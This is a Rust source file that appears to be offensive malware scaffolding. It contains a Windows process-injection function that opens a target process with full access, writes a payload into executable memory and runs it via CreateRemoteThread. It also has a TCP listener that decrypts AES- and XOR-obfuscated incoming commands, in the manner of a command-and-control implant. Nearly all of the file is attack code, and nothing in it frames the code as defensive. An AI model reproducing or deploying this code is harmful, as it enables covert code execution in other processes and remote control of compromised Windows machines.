use std::ffi::CString;
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::handleapi::CloseHandle;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
use std::ptr;
use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use aes::{Aes128, BlockEncrypt, BlockDecrypt};
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::str;

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

fn xor_encrypt_decrypt(data: &mut Vec<u8>, key: u8) {
    for byte in data.iter_mut() {
        *byte ^= key;
    }
}

fn inject_process(target_pid: u32, payload: Vec<u8>) -> Result<(), String> {
    unsafe {
        // Open the target process with all access rights
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if process_handle.is_null() {
            return Err("Failed to open process".to_string());
        }

        // Allocate memory in the target process
        let allocated_memory = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if allocated_memory.is_null() {
            CloseHandle(process_handle);
            return Err("Failed to allocate memory in the target process".to_string());
        }

        // Write the payload into the allocated memory
        if WriteProcessMemory(
            process_handle,
            allocated_memory,
            payload.as_ptr() as *const _,
            payload.len(),
            ptr::null_mut(),
        ) == 0
        {
            CloseHandle(process_handle);
            return Err("Failed to write memory into the target process".to_string());
        }

        // Create a remote thread to execute the payload
        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(allocated_memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread_handle.is_null() {
            CloseHandle(process_handle);
            return Err("Failed to create remote thread".to_string());
        }

        // Wait for the remote thread to complete
        WaitForSingleObject(thread_handle, winapi::um::winbase::INFINITE);

        // Clean up handles
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }

    Ok(())
}

fn handle_client(mut stream: TcpStream) {

    let key = b"verysecretkey123"; 
    let iv = b"randomiv12345678"; 
    let cipher = Aes128Cbc::new_from_slices(key, iv).unwrap();

    let mut buffer = [0; 512];
    let bytes_read = stream.read(&mut buffer).unwrap();
    let received_data = &buffer[..bytes_read];
    let mut decrypted_data = cipher.decrypt_vec(&received_data).unwrap();
    let xkey = 123;
    xor_encrypt_decrypt(&mut decrypted_data,xkey );
    println!("Received: {:?}", buffer);
    println!("After de-obfuscation :{:?}",decrypted_data);
    println!("Decrypted: {:?}", str::from_utf8(&decrypted_data).unwrap());
    // Process the received command
    stream.write(b"Command executed").unwrap();
}
fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_client(stream);
            }
            Err(_) => { /* Handle error */ }
        }
    }
}
